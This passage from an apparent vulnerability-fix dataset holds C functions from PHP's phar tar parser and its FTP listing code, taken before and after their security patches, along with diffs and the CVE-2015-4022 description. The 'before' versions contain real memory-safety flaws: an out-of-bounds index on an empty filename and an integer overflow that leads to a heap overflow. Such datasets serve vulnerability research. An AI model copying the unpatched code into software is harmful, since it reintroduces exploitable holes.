fname);\n\t\t\t\t\t}\n\t\t\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\t\t\t}\n\t\t\tzend_hash_add(&(PHAR_GLOBALS->phar_alias_map), alias, alias_len, (void*)&myphar, sizeof(phar_archive_data*), NULL);\n\t\t\tmyphar->alias = pestrndup(alias, alias_len, myphar->is_persistent);\n\t\t\tmyphar->alias_len = alias_len;\n\t\t} else {\n\t\t\tmyphar->alias = pestrndup(myphar->fname, fname_len, myphar->is_persistent);\n\t\t\tmyphar->alias_len = fname_len;\n\t\t}\n\n\t\tmyphar->is_temporary_alias = 1;\n\t}\n\n\tif (pphar) {\n\t\t*pphar = myphar;\n\t}\n\n\treturn SUCCESS;\n}",
        "func": "int phar_parse_tarfile(php_stream* fp, char *fname, int fname_len, char *alias, int alias_len, phar_archive_data** pphar, int is_data, php_uint32 compression, char **error TSRMLS_DC) /* {{{ */\n{\n\tchar buf[512], *actual_alias = NULL, *p;\n\tphar_entry_info entry = {0};\n\tsize_t pos = 0, read, totalsize;\n\ttar_header *hdr;\n\tphp_uint32 sum1, sum2, size, old;\n\tphar_archive_data *myphar, **actual;\n\tint last_was_longlink = 0;\n\n\tif (error) {\n\t\t*error = NULL;\n\t}\n\n\tphp_stream_seek(fp, 0, SEEK_END);\n\ttotalsize = php_stream_tell(fp);\n\tphp_stream_seek(fp, 0, SEEK_SET);\n\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\tif (read != sizeof(buf)) {\n\t\tif (error) {\n\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is not a tar file or is truncated\", fname);\n\t\t}\n\t\tphp_stream_close(fp);\n\t\treturn FAILURE;\n\t}\n\n\thdr = (tar_header*)buf;\n\told = (memcmp(hdr->magic, \"ustar\", sizeof(\"ustar\")-1) != 0);\n\n\tmyphar = (phar_archive_data *) pecalloc(1, sizeof(phar_archive_data), PHAR_G(persist));\n\tmyphar->is_persistent = PHAR_G(persist);\n\t/* estimate number of entries, can't be certain with tar files */\n\tzend_hash_init(&myphar->manifest, 2 + (totalsize >> 12),\n\t\tzend_get_hash_value, destroy_phar_manifest_entry, (zend_bool)myphar->is_persistent);\n\tzend_hash_init(&myphar->mounted_dirs, 5,\n\t\tzend_get_hash_value, NULL, (zend_bool)myphar->is_persistent);\n\tzend_hash_init(&myphar->virtual_dirs, 4 + (totalsize >> 11),\n\t\tzend_get_hash_value, NULL, (zend_bool)myphar->is_persistent);\n\tmyphar->is_tar = 1;\n\t/* remember whether this entire phar was compressed with gz/bzip2 */\n\tmyphar->flags = compression;\n\n\tentry.is_tar = 1;\n\tentry.is_crc_checked = 1;\n\tentry.phar = myphar;\n\tpos += sizeof(buf);\n\n\tdo {\n\t\tphar_entry_info *newentry;\n\n\t\tpos = php_stream_tell(fp);\n\t\thdr = (tar_header*) buf;\n\t\tsum1 = phar_tar_number(hdr->checksum, sizeof(hdr->checksum));\n\t\tif (sum1 == 0 && phar_tar_checksum(buf, sizeof(buf)) == 0) {\n\t\t\tbreak;\n\t\t}\n\t\tmemset(hdr->checksum, ' ', sizeof(hdr->checksum));\n\t\tsum2 = phar_tar_checksum(buf, old?sizeof(old_tar_header):sizeof(tar_header));\n\n\t\tsize = entry.uncompressed_filesize = entry.compressed_filesize =\n\t\t\tphar_tar_number(hdr->size, sizeof(hdr->size));\n\n\t\t/* skip global/file headers (pax) */\n\t\tif (!old && (hdr->typeflag == TAR_GLOBAL_HDR || hdr->typeflag == TAR_FILE_HDR)) {\n\t\t\tsize = (size+511)&~511;\n\t\t\tgoto next;\n\t\t}\n\n\t\tif (((!old && hdr->prefix[0] == 0) || old) && strlen(hdr->name) == sizeof(\".phar/signature.bin\")-1 && !strncmp(hdr->name, \".phar/signature.bin\", sizeof(\".phar/signature.bin\")-1)) {\n\t\t\toff_t curloc;\n\n\t\t\tif (size > 511) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has signature that is larger than 511 bytes, cannot process\", fname);\n\t\t\t\t}\nbail:\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tcurloc = php_stream_tell(fp);\n\t\t\tread = php_stream_read(fp, buf, size);\n\t\t\tif (read != size) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" signature cannot be read\", fname);\n\t\t\t\t}\n\t\t\t\tgoto bail;\n\t\t\t}\n#ifdef WORDS_BIGENDIAN\n# define PHAR_GET_32(buffer) \\\n\t(((((unsigned char*)(buffer))[3]) << 24) \\\n\t\t| ((((unsigned char*)(buffer))[2]) << 16) \\\n\t\t| ((((unsigned char*)(buffer))[1]) <<  8) \\\n\t\t| (((unsigned char*)(buffer))[0]))\n#else\n# define PHAR_GET_32(buffer) (php_uint32) *(buffer)\n#endif\n\t\t\tmyphar->sig_flags = PHAR_GET_32(buf);\n\t\t\tif (FAILURE == phar_verify_signature(fp, php_stream_tell(fp) - size - 512, myphar->sig_flags, buf + 8, size - 8, fname, &myphar->signature, &myphar->sig_len, error TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tchar *save = *error;\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" signature cannot be verified: %s\", fname, save);\n\t\t\t\t\tefree(save);\n\t\t\t\t}\n\t\t\t\tgoto bail;\n\t\t\t}\n\t\t\tphp_stream_seek(fp, curloc + 512, SEEK_SET);\n\t\t\t/* signature checked out, let's ensure this is the last file in the phar */\n\t\t\tif (((hdr->typeflag == '\\0') || (hdr->typeflag == TAR_FILE)) && size > 0) {\n\t\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\t\tphp_stream_seek(fp, 512, SEEK_CUR);\n\t\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t\t}\n\t\t\t\t\tphp_stream_close(fp);\n\t\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\t\t\tif (read != sizeof(buf)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\thdr = (tar_header*) buf;\n\t\t\tsum1 = phar_tar_number(hdr->checksum, sizeof(hdr->checksum));\n\n\t\t\tif (sum1 == 0 && phar_tar_checksum(buf, sizeof(buf)) == 0) {\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" has entries after signature, invalid phar\", fname);\n\t\t\t}\n\n\t\t\tgoto bail;\n\t\t}\n\n\t\tif (!last_was_longlink && hdr->typeflag == 'L') {\n\t\t\tlast_was_longlink = 1;\n\t\t\t/* support the ././@LongLink system for storing long filenames */\n\t\t\tentry.filename_len = entry.uncompressed_filesize;\n\n\t\t\t/* Check for overflow - bug 61065 */\n\t\t\tif (entry.filename_len == UINT_MAX) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (invalid entry size)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.filename = pemalloc(entry.filename_len+1, myphar->is_persistent);\n\n\t\t\tread = php_stream_read(fp, entry.filename, entry.filename_len);\n\t\t\tif (read != entry.filename_len) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.filename[entry.filename_len] = '\\0';\n\n\t\t\t/* skip blank stuff */\n\t\t\tsize = ((size+511)&~511) - size;\n\n\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\tphp_stream_seek(fp, size, SEEK_CUR);\n\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\t\t\tif (read != sizeof(buf)) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tcontinue;\n\t\t} else if (!last_was_longlink && !old && hdr->prefix[0] != 0) {\n\t\t\tchar name[256];\n\t\t\tint i, j;\n\n\t\t\tfor (i = 0; i < 155; i++) {\n\t\t\t\tname[i] = hdr->prefix[i];\n\t\t\t\tif (name[i] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tname[i++] = '/';\n\t\t\tfor (j = 0; j < 100; j++) {\n\t\t\t\tname[i+j] = hdr->name[j];\n\t\t\t\tif (name[i+j] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tentry.filename_len = i+j;\n\n\t\t\tif (name[entry.filename_len - 1] == '/') {\n\t\t\t\t/* some tar programs store directories with trailing slash */\n\t\t\t\tentry.filename_len--;\n\t\t\t}\n\t\t\tentry.filename = pestrndup(name, entry.filename_len, myphar->is_persistent);\n\t\t} else if (!last_was_longlink) {\n\t\t\tint i;\n\n\t\t\t/* calculate strlen, which can be no longer than 100 */\n\t\t\tfor (i = 0; i < 100; i++) {\n\t\t\t\tif (hdr->name[i] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tentry.filename_len = i;\n\t\t\tentry.filename = pestrndup(hdr->name, i, myphar->is_persistent);\n\n\t\t\tif (i > 0 && entry.filename[entry.filename_len - 1] == '/') {\n\t\t\t\t/* some tar programs store directories with trailing slash */\n\t\t\t\tentry.filename[entry.filename_len - 1] = '\\0';\n\t\t\t\tentry.filename_len--;\n\t\t\t}\n\t\t}\n\t\tlast_was_longlink = 0;\n\n\t\tphar_add_virtual_dirs(myphar, entry.filename, entry.filename_len TSRMLS_CC);\n\n\t\tif (sum1 != sum2) {\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (checksum mismatch of file \\\"%s\\\")\", fname, entry.filename);\n\t\t\t}\n\t\t\tpefree(entry.filename, myphar->is_persistent);\n\t\t\tphp_stream_close(fp);\n\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\treturn FAILURE;\n\t\t}\n\n\t\tentry.tar_type = ((old & (hdr->typeflag == '\\0')) ? TAR_FILE : hdr->typeflag);\n\t\tentry.offset = entry.offset_abs = pos; /* header_offset unused in tar */\n\t\tentry.fp_type = PHAR_FP;\n\t\tentry.flags = phar_tar_number(hdr->mode, sizeof(hdr->mode)) & PHAR_ENT_PERM_MASK;\n\t\tentry.timestamp = phar_tar_number(hdr->mtime, sizeof(hdr->mtime));\n\t\tentry.is_persistent = myphar->is_persistent;\n#ifndef S_ISDIR\n#define S_ISDIR(mode)\t(((mode)&S_IFMT) == S_IFDIR)\n#endif\n\t\tif (old && entry.tar_type == TAR_FILE && S_ISDIR(entry.flags)) {\n\t\t\tentry.tar_type = TAR_DIR;\n\t\t}\n\n\t\tif (entry.tar_type == TAR_DIR) {\n\t\t\tentry.is_dir = 1;\n\t\t} else {\n\t\t\tentry.is_dir = 0;\n\t\t}\n\n\t\tentry.link = NULL;\n\n\t\tif (entry.tar_type == TAR_LINK) {\n\t\t\tif (!zend_hash_exists(&myphar->manifest, hdr->linkname, strlen(hdr->linkname))) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file - hard link to non-existent file \\\"%s\\\"\", fname, hdr->linkname);\n\t\t\t\t}\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.link = estrdup(hdr->linkname);\n\t\t} else if (entry.tar_type == TAR_SYMLINK) {\n\t\t\tentry.link = estrdup(hdr->linkname);\n\t\t}\n\t\tphar_set_inode(&entry TSRMLS_CC);\n\t\tzend_hash_add(&myphar->manifest, entry.filename, entry.filename_len, (void*)&entry, sizeof(phar_entry_info), (void **) &newentry);\n\n\t\tif (entry.is_persistent) {\n\t\t\t++entry.manifest_pos;\n\t\t}\n\n\t\tif (entry.filename_len >= sizeof(\".phar/.metadata\")-1 && !memcmp(entry.filename, \".phar/.metadata\", sizeof(\".phar/.metadata\")-1)) {\n\t\t\tif (FAILURE == phar_tar_process_metadata(newentry, fp TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has invalid metadata in magic file \\\"%s\\\"\", fname, entry.filename);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tif (!actual_alias && entry.filename_len == sizeof(\".phar/alias.txt\")-1 && !strncmp(entry.filename, \".phar/alias.txt\", sizeof(\".phar/alias.txt\")-1)) {\n\t\t\t/* found explicit alias */\n\t\t\tif (size > 511) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has alias that is larger than 511 bytes, cannot process\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, size);\n\n\t\t\tif (read == size) {\n\t\t\t\tbuf[size] = '\\0';\n\t\t\t\tif (!phar_validate_alias(buf, size)) {\n\t\t\t\t\tif (size > 50) {\n\t\t\t\t\t\tbuf[50] = '.';\n\t\t\t\t\t\tbuf[51] = '.';\n\t\t\t\t\t\tbuf[52] = '.';\n\t\t\t\t\t\tbuf[53] = '\\0';\n\t\t\t\t\t}\n\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: invalid alias \\\"%s\\\" in tar-based phar \\\"%s\\\"\", buf, fname);\n\t\t\t\t\t}\n\n\t\t\t\t\tphp_stream_close(fp);\n\t\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\n\t\t\t\tactual_alias = pestrndup(buf, size, myphar->is_persistent);\n\t\t\t\tmyphar->alias = actual_alias;\n\t\t\t\tmyphar->alias_len = size;\n\t\t\t\tphp_stream_seek(fp, pos, SEEK_SET);\n\t\t\t} else {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to read alias from tar-based phar \\\"%s\\\"\", fname);\n\t\t\t\t}\n\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tsize = (size+511)&~511;\n\n\t\tif (((hdr->typeflag == '\\0') || (hdr->typeflag == TAR_FILE)) && size > 0) {\nnext:\n\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\tphp_stream_seek(fp, size, SEEK_CUR);\n\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\t\tif (read != sizeof(buf)) {\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t}\n\t\t\tphp_stream_close(fp);\n\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\treturn FAILURE;\n\t\t}\n\t} while (read != 0);\n\n\tif (zend_hash_exists(&(myphar->manifest), \".phar/stub.php\", sizeof(\".phar/stub.php\")-1)) {\n\t\tmyphar->is_data = 0;\n\t} else {\n\t\tmyphar->is_data = 1;\n\t}\n\n\t/* ensure signature set */\n\tif (!myphar->is_data && PHAR_G(require_hash) && !myphar->signature) {\n\t\tphp_stream_close(fp);\n\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\tif (error) {\n\t\t\tspprintf(error, 0, \"tar-based phar \\\"%s\\\" does not have a signature\", fname);\n\t\t}\n\t\treturn FAILURE;\n\t}\n\n\tmyphar->fname = pestrndup(fname, fname_len, myphar->is_persistent);\n#ifdef PHP_WIN32\n\tphar_unixify_path_separators(myphar->fname, fname_len);\n#endif\n\tmyphar->fname_len = fname_len;\n\tmyphar->fp = fp;\n\tp = strrchr(myphar->fname, '/');\n\n\tif (p) {\n\t\tmyphar->ext = memchr(p, '.', (myphar->fname + fname_len) - p);\n\t\tif (myphar->ext == p) {\n\t\t\tmyphar->ext = memchr(p + 1, '.', (myphar->fname + fname_len) - p - 1);\n\t\t}\n\t\tif (myphar->ext) {\n\t\t\tmyphar->ext_len = (myphar->fname + fname_len) - myphar->ext;\n\t\t}\n\t}\n\n\tphar_request_initialize(TSRMLS_C);\n\n\tif (SUCCESS != zend_hash_add(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len, (void*)&myphar, sizeof(phar_archive_data*), (void **)&actual)) {\n\t\tif (error) {\n\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\" to phar registry\", fname);\n\t\t}\n\t\tphp_stream_close(fp);\n\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\treturn FAILURE;\n\t}\n\n\tmyphar = *actual;\n\n\tif (actual_alias) {\n\t\tphar_archive_data **fd_ptr;\n\n\t\tmyphar->is_temporary_alias = 0;\n\n\t\tif (SUCCESS == zend_hash_find(&(PHAR_GLOBALS->phar_alias_map), actual_alias, myphar->alias_len, (void **)&fd_ptr)) {\n\t\t\tif (SUCCESS != phar_free_alias(*fd_ptr, actual_alias, myphar->alias_len TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\", alias is already in use\", fname);\n\t\t\t\t}\n\t\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tzend_hash_add(&(PHAR_GLOBALS->phar_alias_map), actual_alias, myphar->alias_len, (void*)&myphar, sizeof(phar_archive_data*), NULL);\n\t} else {\n\t\tphar_archive_data **fd_ptr;\n\n\t\tif (alias_len) {\n\t\t\tif (SUCCESS == zend_hash_find(&(PHAR_GLOBALS->phar_alias_map), alias, alias_len, (void **)&fd_ptr)) {\n\t\t\t\tif (SUCCESS != phar_free_alias(*fd_ptr, alias, alias_len TSRMLS_CC)) {\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\", alias is already in use\", fname);\n\t\t\t\t\t}\n\t\t\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\t\t\t}\n\t\t\tzend_hash_add(&(PHAR_GLOBALS->phar_alias_map), alias, alias_len, (void*)&myphar, sizeof(phar_archive_data*), NULL);\n\t\t\tmyphar->alias = pestrndup(alias, alias_len, myphar->is_persistent);\n\t\t\tmyphar->alias_len = alias_len;\n\t\t} else {\n\t\t\tmyphar->alias = pestrndup(myphar->fname, fname_len, myphar->is_persistent);\n\t\t\tmyphar->alias_len = fname_len;\n\t\t}\n\n\t\tmyphar->is_temporary_alias = 1;\n\t}\n\n\tif (pphar) {\n\t\t*pphar = myphar;\n\t}\n\n\treturn SUCCESS;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -237,7 +237,7 @@\n \t\t\tentry.filename_len = i;\n \t\t\tentry.filename = pestrndup(hdr->name, i, myphar->is_persistent);\n \n-\t\t\tif (entry.filename[entry.filename_len - 1] == '/') {\n+\t\t\tif (i > 0 && entry.filename[entry.filename_len - 1] == '/') {\n \t\t\t\t/* some tar programs store directories with trailing slash */\n \t\t\t\tentry.filename[entry.filename_len - 1] = '\\0';\n \t\t\t\tentry.filename_len--;",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t\tif (entry.filename[entry.filename_len - 1] == '/') {"
            ],
            "added_lines": [
                "\t\t\tif (i > 0 && entry.filename[entry.filename_len - 1] == '/') {"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4022",
        "func_name": "php/php-src/ftp_genlist",
        "description": "Integer overflow in the ftp_genlist function in ext/ftp/ftp.c in PHP before 5.4.41, 5.5.x before 5.5.25, and 5.6.x before 5.6.9 allows remote FTP servers to execute arbitrary code via a long reply to a LIST command, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/739adee1912176aacf351edc5751a02ded6ef1ec",
        "commit_title": "Fix bug #69545 - avoid overflow when reading list",
        "commit_text": "",
        "func_before": "char**\nftp_genlist(ftpbuf_t *ftp, const char *cmd, const char *path TSRMLS_DC)\n{\n\tphp_stream\t*tmpstream = NULL;\n\tdatabuf_t\t*data = NULL;\n\tchar\t\t*ptr;\n\tint\t\tch, lastch;\n\tint\t\tsize, rcvd;\n\tint\t\tlines;\n\tchar\t\t**ret = NULL;\n\tchar\t\t**entry;\n\tchar\t\t*text;\n\n\n\tif ((tmpstream = php_stream_fopen_tmpfile()) == NULL) {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Unable to create temporary file.  Check permissions in temporary files directory.\");\n\t\treturn NULL;\n\t}\n\n\tif (!ftp_type(ftp, FTPTYPE_ASCII)) {\n\t\tgoto bail;\n\t}\n\n\tif ((data = ftp_getdata(ftp TSRMLS_CC)) == NULL) {\n\t\tgoto bail;\n\t}\n\tftp->data = data;\t\n\n\tif (!ftp_putcmd(ftp, cmd, path)) {\n\t\tgoto bail;\n\t}\n\tif (!ftp_getresp(ftp) || (ftp->resp != 150 && ftp->resp != 125 && ftp->resp != 226)) {\n\t\tgoto bail;\n\t}\n\n\t/* some servers don't open a ftp-data connection if the directory is empty */\n\tif (ftp->resp == 226) {\n\t\tftp->data = data_close(ftp, data);\n\t\tphp_stream_close(tmpstream);\n\t\treturn ecalloc(1, sizeof(char*));\n\t}\n\n\t/* pull data buffer into tmpfile */\n\tif ((data = data_accept(data, ftp TSRMLS_CC)) == NULL) {\n\t\tgoto bail;\n\t}\n\tsize = 0;\n\tlines = 0;\n\tlastch = 0;\n\twhile ((rcvd = my_recv(ftp, data->fd, data->buf, FTP_BUFSIZE))) {\n\t\tif (rcvd == -1) {\n\t\t\tgoto bail;\n\t\t}\n\n\t\tphp_stream_write(tmpstream, data->buf, rcvd);\n\n\t\tsize += rcvd;\n\t\tfor (ptr = data->buf; rcvd; rcvd--, ptr++) {\n\t\t\tif (*ptr == '\\n' && lastch == '\\r') {\n\t\t\t\tlines++;\n\t\t\t} else {\n\t\t\t\tsize++;\n\t\t\t}\n\t\t\tlastch = *ptr;\n\t\t}\n\t}\n\n\tftp->data = data_close(ftp, data);\n\n\tphp_stream_rewind(tmpstream);\n\n\tret = safe_emalloc((lines + 1), sizeof(char*), size);\n\n\tentry = ret;\n\ttext = (char*) (ret + lines + 1);\n\t*entry = text;\n\tlastch = 0;\n\twhile ((ch = php_stream_getc(tmpstream)) != EOF) {\n\t\tif (ch == '\\n' && lastch == '\\r') {\n\t\t\t*(text - 1) = 0;\n\t\t\t*++entry = text;\n\t\t} else {\n\t\t\t*text++ = ch;\n\t\t}\n\t\tlastch = ch;\n\t}\n\t*entry = NULL;\n\n\tphp_stream_close(tmpstream);\n\n\tif (!ftp_getresp(ftp) || (ftp->resp != 226 && ftp->resp != 250)) {\n\t\tefree(ret);\n\t\treturn NULL;\n\t}\n\n\treturn ret;\nbail:\n\tftp->data = data_close(ftp, data);\n\tphp_stream_close(tmpstream);\n\tif (ret)\n\t\tefree(ret);\n\treturn NULL;\n}",
        "func": "char**\nftp_genlist(ftpbuf_t *ftp, const char *cmd, const char *path TSRMLS_DC)\n{\n\tphp_stream\t*tmpstream = NULL;\n\tdatabuf_t\t*data = NULL;\n\tchar\t\t*ptr;\n\tint\t\tch, lastch;\n\tsize_t\t\tsize, rcvd;\n\tsize_t\t\tlines;\n\tchar\t\t**ret = NULL;\n\tchar\t\t**entry;\n\tchar\t\t*text;\n\n\n\tif ((tmpstream = php_stream_fopen_tmpfile()) == NULL) {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Unable to create temporary file.  Check permissions in temporary files directory.\");\n\t\treturn NULL;\n\t}\n\n\tif (!ftp_type(ftp, FTPTYPE_ASCII)) {\n\t\tgoto bail;\n\t}\n\n\tif ((data = ftp_getdata(ftp TSRMLS_CC)) == NULL) {\n\t\tgoto bail;\n\t}\n\tftp->data = data;\n\n\tif (!ftp_putcmd(ftp, cmd, path)) {\n\t\tgoto bail;\n\t}\n\tif (!ftp_getresp(ftp) || (ftp->resp != 150 && ftp->resp != 125 && ftp->resp != 226)) {\n\t\tgoto bail;\n\t}\n\n\t/* some servers don't open a ftp-data connection if the directory is empty */\n\tif (ftp->resp == 226) {\n\t\tftp->data = data_close(ftp, data);\n\t\tphp_stream_close(tmpstream);\n\t\treturn ecalloc(1, sizeof(char*));\n\t}\n\n\t/* pull data buffer into tmpfile */\n\tif ((data = data_accept(data, ftp TSRMLS_CC)) == NULL) {\n\t\tgoto bail;\n\t}\n\tsize = 0;\n\tlines = 0;\n\tlastch = 0;\n\twhile ((rcvd = my_recv(ftp, data->fd, data->buf, FTP_BUFSIZE))) {\n\t\tif (rcvd == -1 || rcvd > ((size_t)(-1))-size) {\n\t\t\tgoto bail;\n\t\t}\n\n\t\tphp_stream_write(tmpstream, data->buf, rcvd);\n\n\t\tsize += rcvd;\n\t\tfor (ptr = data->buf; rcvd; rcvd--, ptr++) {\n\t\t\tif (*ptr == '\\n' && lastch == '\\r') {\n\t\t\t\tlines++;\n\t\t\t} else {\n\t\t\t\tsize++;\n\t\t\t}\n\t\t\tlastch = *ptr;\n\t\t}\n\t}\n\n\tftp->data = data_close(ftp, data);\n\n\tphp_stream_rewind(tmpstream);\n\n\tret = safe_emalloc((lines + 1), sizeof(char*), size);\n\n\tentry = ret;\n\ttext = (char*) (ret + lines + 1);\n\t*entry = text;\n\tlastch = 0;\n\twhile ((ch = php_stream_getc(tmpstream)) != EOF) {\n\t\tif (ch == '\\n' && lastch == '\\r') {\n\t\t\t*(text - 1) = 0;\n\t\t\t*++entry = text;\n\t\t} else {\n\t\t\t*text++ = ch;\n\t\t}\n\t\tlastch = ch;\n\t}\n\t*entry = NULL;\n\n\tphp_stream_close(tmpstream);\n\n\tif (!ftp_getresp(ftp) || (ftp->resp != 226 && ftp->resp != 250)) {\n\t\tefree(ret);\n\t\treturn NULL;\n\t}\n\n\treturn ret;\nbail:\n\tftp->data = data_close(ftp, data);\n\tphp_stream_close(tmpstream);\n\tif (ret)\n\t\tefree(ret);\n\treturn NULL;\n}",
